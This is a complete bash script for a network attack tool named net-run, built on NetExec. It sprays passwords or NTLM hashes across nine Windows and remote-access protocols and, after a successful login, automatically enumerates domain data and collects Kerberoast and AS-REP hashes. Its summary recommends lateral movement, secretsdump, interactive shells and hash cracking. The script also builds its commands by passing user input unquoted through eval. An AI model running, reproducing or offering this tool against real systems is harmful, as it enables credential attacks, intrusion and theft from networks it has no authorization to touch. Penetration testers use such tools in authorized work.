#!/bin/bash
# ═══════════════════════════════════════════════════════════════
#  net-run — Multi-protocol credential validator & quick enum
#  Usage: net-run.sh <target> <user> <pass|hash> [options]
#  Author: TheHuskyHacker
# ═══════════════════════════════════════════════════════════════

VERSION="1.0.0"

# ── Colors ──────────────────────────────────────────────────────
R='\033[0;31m'    BR='\033[1;31m'
G='\033[0;32m'    BG='\033[1;32m'
Y='\033[1;33m'    B='\033[0;34m'
C='\033[0;36m'    BC='\033[1;36m'
W='\033[1;37m'    DIM='\033[2m'
UL='\033[4m'      NC='\033[0m'

# ── Defaults ────────────────────────────────────────────────────
OUTDIR="./net-run_results"
NXC_TIMEOUT=8
KILL_TIMEOUT=3
ENUM_ON_WIN=true
PROTOCOLS="all"
AUTH_TYPE="password"  # password | hash
DOMAIN=""
LOCAL_AUTH=false
QUIET=false
TARGETS_FILE=""
CRED_USERS_FILE=""
PASS_FILE=""

# ── Banner ──────────────────────────────────────────────────────
banner() {
    echo -e "${BC}"
    cat << 'EOF'
                __
  ____   ____ _/  |_         _______ __ __  ____
 /    \_/ __ \\   __\ ______ \_  __ \  |  \/    \
|   |  \  ___/ |  |  /_____/  |  | \/  |  /   |  \
|___|  /\___  >|__|           |__|  |____/|___|  /
     \/     \/                                 \/
EOF
    echo -e "${NC}"
    echo -e "  ${W}net-run${NC} ${DIM}v${VERSION}${NC} — ${C}Multi-protocol credential validator${NC}"
    echo -e "  ${DIM}──────────────────────────────────────────────${NC}"
    echo ""
}

# ── Usage ───────────────────────────────────────────────────────
usage() {
    banner
    cat << EOF
  ${W}USAGE${NC}
    $(basename "$0") <target> <user> <pass> [options]
    $(basename "$0") -T targets.txt -U users.txt -P passes.txt [options]

  ${W}POSITIONAL${NC}
    target        IP, CIDR range, or hostname
    user          Username (or -U for file)
    pass          Password or NTLM hash (or -P for file)

  ${W}OPTIONS${NC}
    -T FILE       Target list (one per line)
    -U FILE       Username list (one per line)
    -P FILE       Password/hash list (one per line)
    -H            Treat password arg as NTLM hash (pass-the-hash)
    -d DOMAIN     Specify domain for auth
    -L            Force local auth on all protocols
    -p PROTOS     Comma-separated protocols to test
                  (smb,ldap,mssql,rdp,winrm,ftp,ssh,vnc,wmi)
                  Default: all available
    -o DIR        Output directory (default: ./net-run_results)
    -E            Skip auto-enumeration on successful auth
    -q            Quiet mode — only show hits
    -h            This help

  ${W}EXAMPLES${NC}
    $(basename "$0") 10.10.10.5 admin Password123
    $(basename "$0") 10.10.10.5 administrator -H aad3b435b51404ee:deadbeefcafe1234
    $(basename "$0") 192.168.1.0/24 admin Password123 -p smb,rdp
    $(basename "$0") -T targets.txt -U users.txt -P passes.txt -d corp.local
    $(basename "$0") 10.10.10.5 sa Password123 -p mssql -L

EOF
    exit 0
}

# ── Logging helpers ─────────────────────────────────────────────
log_hit()   { echo -e "  ${BG}[+]${NC} $*"; }
log_info()  { [[ "$QUIET" == false ]] && echo -e "  ${C}[*]${NC} $*"; }
log_warn()  { echo -e "  ${Y}[!]${NC} $*"; }
log_fail()  { echo -e "  ${R}[-]${NC} $*"; }
log_section() { echo -e "\n  ${W}═══ $* ═══${NC}"; }

# ── Dependency check ────────────────────────────────────────────
check_deps() {
    local missing=()
    for cmd in nxc timeout; do
        command -v "$cmd" &>/dev/null || missing+=("$cmd")
    done
    if [[ ${#missing[@]} -gt 0 ]]; then
        log_fail "Missing required tools: ${missing[*]}"
        exit 1
    fi
}

# ── Parse args ──────────────────────────────────────────────────
parse_args() {
    while [[ $# -gt 0 ]]; do
        case "$1" in
            -h|--help)   usage ;;
            -H)          AUTH_TYPE="hash"; shift ;;
            -d)          DOMAIN="$2"; shift 2 ;;
            -L)          LOCAL_AUTH=true; shift ;;
            -p)          PROTOCOLS="$2"; shift 2 ;;
            -o)          OUTDIR="$2"; shift 2 ;;
            -T)          TARGETS_FILE="$2"; shift 2 ;;
            -U)          CRED_USERS_FILE="$2"; shift 2 ;;
            -P)          PASS_FILE="$2"; shift 2 ;;
            -E)          ENUM_ON_WIN=false; shift ;;
            -q)          QUIET=true; shift ;;
            -*)          log_fail "Unknown option: $1"; usage ;;
            *)
                # Positional args: target user pass
                if [[ -z "$TARGET" ]]; then
                    TARGET="$1"
                elif [[ -z "$CRED_USER" ]]; then
                    CRED_USER="$1"
                elif [[ -z "$PASS" ]]; then
                    PASS="$1"
                fi
                shift
                ;;
        esac
    done

    # Validate inputs
    if [[ -z "$TARGET" && -z "$TARGETS_FILE" ]]; then
        log_fail "No target specified"
        usage
    fi
    if [[ -z "$CRED_USER" && -z "$CRED_USERS_FILE" ]]; then
        log_fail "No username specified"
        usage
    fi
    if [[ -z "$PASS" && -z "$PASS_FILE" ]]; then
        log_fail "No password/hash specified"
        usage
    fi

    # Validate files exist
    for f in "$TARGETS_FILE" "$CRED_USERS_FILE" "$PASS_FILE"; do
        if [[ -n "$f" && ! -f "$f" ]]; then
            log_fail "File not found: $f"
            exit 1
        fi
    done
}

# ── Build nxc auth flags ────────────────────────────────────────
build_auth_flags() {
    local flags=""

    # User
    if [[ -n "$CRED_USERS_FILE" ]]; then
        flags+=" -u $CRED_USERS_FILE"
    else
        flags+=" -u '$CRED_USER'"
    fi

    # Password / Hash
    if [[ "$AUTH_TYPE" == "hash" ]]; then
        if [[ -n "$PASS_FILE" ]]; then
            flags+=" -H $PASS_FILE"
        else
            flags+=" -H '$PASS'"
        fi
    else
        if [[ -n "$PASS_FILE" ]]; then
            flags+=" -p $PASS_FILE"
        else
            flags+=" -p '$PASS'"
        fi
    fi

    # Domain
    [[ -n "$DOMAIN" ]] && flags+=" -d '$DOMAIN'"

    echo "$flags"
}

# ── Build target string ─────────────────────────────────────────
build_target() {
    if [[ -n "$TARGETS_FILE" ]]; then
        echo "$TARGETS_FILE"
    else
        echo "$TARGET"
    fi
}

# ── Run a single nxc check ──────────────────────────────────────
# Args: label protocol [extra_flags...]
run_check() {
    local label="$1"
    local proto="$2"
    shift 2
    local extra="$*"
    local target_arg
    local auth_flags

    target_arg=$(build_target)
    auth_flags=$(build_auth_flags)

    local outfile="$OUTDIR/${label}.txt"

    eval timeout --kill-after="$KILL_TIMEOUT" "$NXC_TIMEOUT" \
        nxc "$proto" "$target_arg" $auth_flags $extra \
        --timeout 5 --dns-timeout 3 \
        2>/dev/null | tee "$outfile" | while IFS= read -r line; do
            if echo "$line" | grep -q 'Pwn3d!'; then
                echo -e "  ${BR}[ADMIN]${NC} ${W}${label}${NC}: $line"
                echo "$label|ADMIN|$line" >> "$OUTDIR/.hits"
            elif echo "$line" | grep -q '+'; then
                echo -e "  ${BG}[AUTH]${NC}  ${W}${label}${NC}: $line"
                echo "$label|AUTH|$line" >> "$OUTDIR/.hits"
            fi
        done
}

# ── Protocol runners ────────────────────────────────────────────
run_smb() {
    run_check "smb" "smb" &
    if [[ "$LOCAL_AUTH" == true ]]; then
        run_check "smb-local" "smb" "--local-auth" &
    fi
}

run_smb_enum() {
    local target_arg auth_flags
    target_arg=$(build_target)
    auth_flags=$(build_auth_flags)

    log_info "SMB enum: shares, sessions, users, groups, disks..."

    for action in --shares --sessions --users --groups --disks --loggedon-users; do
        eval timeout --kill-after="$KILL_TIMEOUT" 15 \
            nxc smb "$target_arg" $auth_flags $action \
            --timeout 5 --dns-timeout 3 \
            2>/dev/null >> "$OUTDIR/smb_enum.txt"
    done

    # Password policy
    eval timeout --kill-after="$KILL_TIMEOUT" 15 \
        nxc smb "$target_arg" $auth_flags --pass-pol \
        --timeout 5 --dns-timeout 3 \
        2>/dev/null >> "$OUTDIR/smb_passpol.txt"

    log_info "SMB enum saved → smb_enum.txt, smb_passpol.txt"
}

run_ldap() {
    run_check "ldap" "ldap" &
}

run_ldap_enum() {
    local target_arg auth_flags
    target_arg=$(build_target)
    auth_flags=$(build_auth_flags)

    log_info "LDAP enum: users, groups, gmsa, trusts..."

    for action in --users --groups --gmsa --trusted-for-delegation; do
        eval timeout --kill-after="$KILL_TIMEOUT" 15 \
            nxc ldap "$target_arg" $auth_flags $action \
            --timeout 5 --dns-timeout 3 \
            2>/dev/null >> "$OUTDIR/ldap_enum.txt"
    done

    # ASREPRoast & Kerberoast
    eval timeout --kill-after="$KILL_TIMEOUT" 15 \
        nxc ldap "$target_arg" $auth_flags --asreproast "$OUTDIR/asreproast.txt" \
        --timeout 5 --dns-timeout 3 2>/dev/null

    eval timeout --kill-after="$KILL_TIMEOUT" 15 \
        nxc ldap "$target_arg" $auth_flags --kerberoasting "$OUTDIR/kerberoast.txt" \
        --timeout 5 --dns-timeout 3 2>/dev/null

    log_info "LDAP enum saved → ldap_enum.txt"
    [[ -s "$OUTDIR/asreproast.txt" ]] && log_hit "ASREPRoastable accounts found! → asreproast.txt"
    [[ -s "$OUTDIR/kerberoast.txt" ]] && log_hit "Kerberoastable accounts found! → kerberoast.txt"
}

run_mssql() {
    run_check "mssql" "mssql" &
    if [[ "$LOCAL_AUTH" == true ]]; then
        run_check "mssql-local" "mssql" "--local-auth" &
    fi
}

run_mssql_enum() {
    local target_arg auth_flags
    target_arg=$(build_target)
    auth_flags=$(build_auth_flags)

    log_info "MSSQL enum: checking privileges..."

    eval timeout --kill-after="$KILL_TIMEOUT" 15 \
        nxc mssql "$target_arg" $auth_flags --priv \
        --timeout 5 --dns-timeout 3 \
        2>/dev/null >> "$OUTDIR/mssql_enum.txt"

    log_info "MSSQL enum saved → mssql_enum.txt"
}

run_rdp() {
    run_check "rdp" "rdp" &
}

run_winrm() {
    run_check "winrm" "winrm" &
}

run_ftp() {
    run_check "ftp" "ftp" &
}

run_ssh() {
    run_check "ssh" "ssh" &
}

run_vnc() {
    run_check "vnc" "vnc" &
}

run_wmi() {
    run_check "wmi" "wmi" &
}

# ── Determine which protocols to run ────────────────────────────
get_protocols() {
    if [[ "$PROTOCOLS" == "all" ]]; then
        echo "smb ldap mssql rdp winrm ftp ssh vnc wmi"
    else
        echo "$PROTOCOLS" | tr ',' ' '
    fi
}

# ── Auto-enumerate on wins ──────────────────────────────────────
auto_enum() {
    [[ "$ENUM_ON_WIN" == false ]] && return
    [[ ! -f "$OUTDIR/.hits" ]] && return

    log_section "AUTO-ENUMERATION"

    if grep -q "^smb|" "$OUTDIR/.hits" 2>/dev/null || \
       grep -q "^smb-local|" "$OUTDIR/.hits" 2>/dev/null; then
        run_smb_enum
    fi

    if grep -q "^ldap|" "$OUTDIR/.hits" 2>/dev/null; then
        run_ldap_enum
    fi

    if grep -q "^mssql|" "$OUTDIR/.hits" 2>/dev/null || \
       grep -q "^mssql-local|" "$OUTDIR/.hits" 2>/dev/null; then
        run_mssql_enum
    fi
}

# ── Summary ─────────────────────────────────────────────────────
print_summary() {
    echo ""
    echo -e "  ${W}═══════════════════════════════════════════${NC}"
    echo -e "  ${W}  RESULTS SUMMARY${NC}"
    echo -e "  ${W}═══════════════════════════════════════════${NC}"
    echo ""

    if [[ ! -f "$OUTDIR/.hits" ]] || [[ ! -s "$OUTDIR/.hits" ]]; then
        echo -e "  ${R}No successful authentications.${NC}"
    else
        local admin_count auth_count
        admin_count=$(grep -c "|ADMIN|" "$OUTDIR/.hits" 2>/dev/null || echo 0)
        auth_count=$(grep -c "|AUTH|" "$OUTDIR/.hits" 2>/dev/null || echo 0)

        echo -e "  ${BG}Authenticated${NC}: $auth_count    ${BR}Admin/Pwn3d${NC}: $admin_count"
        echo ""

        # Group by protocol
        local prev_proto=""
        sort -t'|' -k1 "$OUTDIR/.hits" | while IFS='|' read -r proto level line; do
            if [[ "$proto" != "$prev_proto" ]]; then
                echo -e "  ${BC}── $proto ──${NC}"
                prev_proto="$proto"
            fi
            if [[ "$level" == "ADMIN" ]]; then
                echo -e "    ${BR}★${NC} $line"
            else
                echo -e "    ${G}✓${NC} $line"
            fi
        done
    fi

    echo ""
    echo -e "  ${DIM}Output → $OUTDIR/${NC}"

    # List generated files (skip hidden)
    local file_count
    file_count=$(find "$OUTDIR" -maxdepth 1 -type f ! -name '.*' 2>/dev/null | wc -l)
    if [[ "$file_count" -gt 0 ]]; then
        echo -e "  ${DIM}Files:${NC}"
        find "$OUTDIR" -maxdepth 1 -type f ! -name '.*' -printf '    %f\n' 2>/dev/null | sort
    fi

    echo ""

    # Actionable next steps based on what hit
    if [[ -f "$OUTDIR/.hits" && -s "$OUTDIR/.hits" ]]; then
        echo -e "  ${Y}Next steps:${NC}"

        if grep -q "^smb.*ADMIN" "$OUTDIR/.hits" 2>/dev/null; then
            echo "    → SMB admin: secretsdump, SAM dump, lateral movement"
        fi
        if grep -q "^winrm|" "$OUTDIR/.hits" 2>/dev/null; then
            echo "    → WinRM: evil-winrm for interactive shell"
        fi
        if grep -q "^rdp|" "$OUTDIR/.hits" 2>/dev/null; then
            echo "    → RDP: xfreerdp for GUI access"
        fi
        if grep -q "^mssql" "$OUTDIR/.hits" 2>/dev/null; then
            echo "    → MSSQL: impacket-mssqlclient, check xp_cmdshell"
        fi
        if grep -q "^ssh|" "$OUTDIR/.hits" 2>/dev/null; then
            echo "    → SSH: interactive shell access"
        fi
        if grep -q "^ldap|" "$OUTDIR/.hits" 2>/dev/null; then
            echo "    → LDAP: BloodHound collection, further AD enum"
        fi
        if [[ -s "$OUTDIR/asreproast.txt" ]]; then
            echo "    → ASREPRoast hashes found — crack with hashcat -m 18200"
        fi
        if [[ -s "$OUTDIR/kerberoast.txt" ]]; then
            echo "    → Kerberoast hashes found — crack with hashcat -m 13100"
        fi
        echo ""
    fi

    # Cleanup hidden tracker
    rm -f "$OUTDIR/.hits"
}

# ── Main ────────────────────────────────────────────────────────
main() {
    parse_args "$@"
    check_deps
    banner

    mkdir -p "$OUTDIR"
    > "$OUTDIR/.hits"  # tracker for successful auths

    # Display config
    local tgt_display
    [[ -n "$TARGETS_FILE" ]] && tgt_display="$TARGETS_FILE" || tgt_display="$TARGET"

    local usr_display
    [[ -n "$CRED_USERS_FILE" ]] && usr_display="$CRED_USERS_FILE" || usr_display="$CRED_USER"

    echo -e "  ${W}Target${NC}:  $tgt_display"
    echo -e "  ${W}User${NC}:    $usr_display"
    echo -e "  ${W}Auth${NC}:    $AUTH_TYPE"
    [[ -n "$DOMAIN" ]] && echo -e "  ${W}Domain${NC}:  $DOMAIN"
    [[ "$LOCAL_AUTH" == true ]] && echo -e "  ${W}Local${NC}:   yes"
    echo -e "  ${W}Output${NC}:  $OUTDIR"
    echo ""

    log_section "CREDENTIAL VALIDATION"

    local protos
    protos=$(get_protocols)

    for proto in $protos; do
        case "$proto" in
            smb)    run_smb ;;
            ldap)   run_ldap ;;
            mssql)  run_mssql ;;
            rdp)    run_rdp ;;
            winrm)  run_winrm ;;
            ftp)    run_ftp ;;
            ssh)    run_ssh ;;
            vnc)    run_vnc ;;
            wmi)    run_wmi ;;
            *)      log_warn "Unknown protocol: $proto" ;;
        esac
    done

    wait

    # Auto-enum if we got hits
    auto_enum

    # Summary
    print_summary
}

main "$@"
